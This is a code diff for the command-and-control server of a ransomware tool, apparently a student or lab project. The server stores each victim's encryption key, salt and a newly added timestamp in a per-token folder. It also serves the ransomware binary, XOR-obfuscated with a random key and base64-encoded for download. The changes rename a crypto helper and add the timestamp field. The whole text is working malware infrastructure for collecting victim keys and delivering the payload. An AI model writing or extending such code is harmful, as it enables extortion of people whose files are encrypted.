@@ -2,7 +2,7 @@ import base64
 from hashlib import sha256
 from http.server import HTTPServer
 import os
-from xorcrypt import xorcrypt 
+from xor_crypt import xor_crypt 
 
 from cncbase import CNCBase
 
@@ -23,11 +23,10 @@ class CNC(CNCBase):
         return {"status": "OK"}
 
     def post_new(self, path: str, params: dict, body: dict) -> dict:
-        print("body", body)
         token = sha256(base64.b64decode(body["token"])).hexdigest()
-
         salt = base64.b64decode(body["salt"])
         key = base64.b64decode(body["key"])
+        timestamp = base64.b64decode(body["timestamp"])
 
         token_dir = os.path.join(self.ROOT_PATH, token)
         os.makedirs(token_dir, exist_ok=True)
@@ -37,6 +36,9 @@ class CNC(CNCBase):
 
         with open(os.path.join(token_dir, "key.bin"), "wb") as key_file:
             key_file.write(key)
+
+        with open(os.path.join(token_dir, "timestamp.bin"), "wb") as timestamp_file:
+            timestamp_file.write(timestamp)
 
         return {"status": "OK"}
     
@@ -61,7 +63,7 @@ class CNC(CNCBase):
         with open(os.path.join(self.RANSOMWARE_PATH, "ransomware"), "rb") as f:
             #random key for obfuscation
             key = os.urandom(32)
-            file = xorcrypt(f.read(), key)
+            file = xor_crypt(f.read(), key)
             return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}
 
 
